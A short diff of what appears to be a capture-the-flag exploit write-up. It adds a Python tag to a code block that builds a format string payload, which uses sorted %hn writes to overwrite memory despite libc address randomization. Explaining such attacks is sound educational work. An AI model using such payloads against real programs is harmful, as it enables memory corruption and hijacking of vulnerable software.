@@ -72,7 +72,8 @@ However that assumption doesnt always hold, because libc addresses are randomize
 But sorting ```[BBBB, CCCC, DDDD]``` and constructing the format string from the lowest entry to the highest will make the attack successfull every time.
 
 The final format string attack:
-```l = [third1, third2, third3]
+```python
+l = [third1, third2, third3]
 l.sort()
 payload = b"%" + ("%05d"%l[0]).encode("ascii") + b"d%11$hn" +\
 	b"%" + ("%05d"%(l[1]-l[0])).encode("ascii") + b"d%12$hn" +\
